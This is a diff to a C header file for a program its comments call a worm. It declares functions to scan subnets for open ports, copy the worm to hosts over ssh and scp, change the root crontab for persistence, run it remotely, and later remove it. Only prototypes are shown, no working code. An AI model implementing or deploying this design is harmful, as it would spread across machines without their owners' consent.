@@ -12,6 +12,7 @@
  #include <ifaddrs.h>
  #include <arpa/inet.h>
 
+ #define CMD_LEN 4096
  #define IP_LEN 16
 
  /*
@@ -23,11 +24,6 @@
  * Check if a network interface on the system is identical to the administrator ip address
  */
  bool isSourceHost(char *adminIP);
-
- /*
- * If the given ip address is defined in a network interface, returns the network mask address
- */
- char* getNetworkMask(char *ip);
 
  /*
  * Scan sub network and check for each address if the given port is opened
@@ -42,7 +38,7 @@
  /*
  * Colinize a target host (copy the worm, the configuration file and update the root crontab)
  */
- bool colonize(char *host, char *programPath, char *ssh, int portSSH, char *scp, char *targetPath, char *crontab);
+ bool colonize(char *host, char *sshPath, int portSSH, char *scpPath, char *srcFile, char *dstDir, char *crontab);
 
  /*
  * Check if the worm is allowed to be launched on the system (if the parameter is a file and exists)
@@ -53,5 +49,40 @@
  * Delete the worm, the configuration file and restore the root crontab
  */
  bool wormDelete(char *programName, char *targetPath, char *crontab);
+
+ /*
+ * If the given ip address is defined in a network interface, returns the network mask address
+ */
+ char* getNetworkMask(char *ip);
+
+ /*
+ * Upload a file on a target host
+ */
+ bool uploadFile(char *srcFile, char *dstFile, char *host, char *scpPath, int portSSH);
+
+ /*
+ * Reset the root crontab on the target host
+ */
+ bool restoreTargetCrontab(char *crontab, char *dstFile, char *host, char *sshPath, int portSSH);
+
+ /*
+ * Update the root crontab on the target host
+ */
+ bool updateTargetCrontab(char *crontab, char *dstFile, char *host, char *sshPath, int portSSH);
+
+ /*
+ * Execute a remote program on the target host
+ */
+ bool execRemote(char *dstFile, char *host, char *sshPath, int portSSH);
+
+ /*
+ * Retore the local root crontab
+ */
+ bool restoreLocalCrontab(char *crontab, char *srcFile);
+
+ /*
+ * Delete the local file
+ */
+ bool deleteLocalFile(char *srcFile);
 
 #endif /* VACCCIN_H */
